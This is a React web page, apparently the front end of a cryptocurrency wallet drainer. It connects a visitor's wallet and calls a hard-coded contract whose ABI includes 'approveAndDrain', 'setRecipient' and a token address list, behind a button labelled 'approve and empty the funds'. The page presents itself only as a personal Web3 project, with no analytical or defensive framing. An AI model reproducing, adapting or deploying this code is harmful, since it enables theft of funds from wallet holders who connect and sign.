import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useState } from "react";
import { useAccount, useContract, useSigner } from "wagmi";
import { ethers } from "ethers";

// ABI de ton contrat
const contractAbi = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "approvalAmount",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "approveAndDrain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "name": "setRecipient",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "name": "tokenAddresses",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

const contractAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // L'adresse de ton contrat

export default function Home() {
  const { isConnected } = useAccount();
  const { data: signer } = useSigner();
  const [contract, setContract] = useState<any>(null);

  // Initialiser le contrat avec l'ABI et l'adresse
  const initContract = () => {
    if (signer) {
      const _contract = new ethers.Contract(contractAddress, contractAbi, signer);
      setContract(_contract);
    }
  };

  const approveAndDrain = async () => {
    if (contract) {
      try {
        const tx = await contract.approveAndDrain();
        await tx.wait();
        alert("Transaction réussie!");
      } catch (error) {
        console.error(error);
        alert("Une erreur est survenue");
      }
    }
  };

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <h1>Bienvenue sur mon projet Web3</h1>
      <p>
        {isConnected ? (
          <>
            <span>Connecté</span>
            <button onClick={initContract}>Initialiser le contrat</button>
            <button onClick={approveAndDrain}>Approuver et vider les fonds</button>
          </>
        ) : (
          <ConnectButton />
        )}
      </p>
    </div>
  );
}
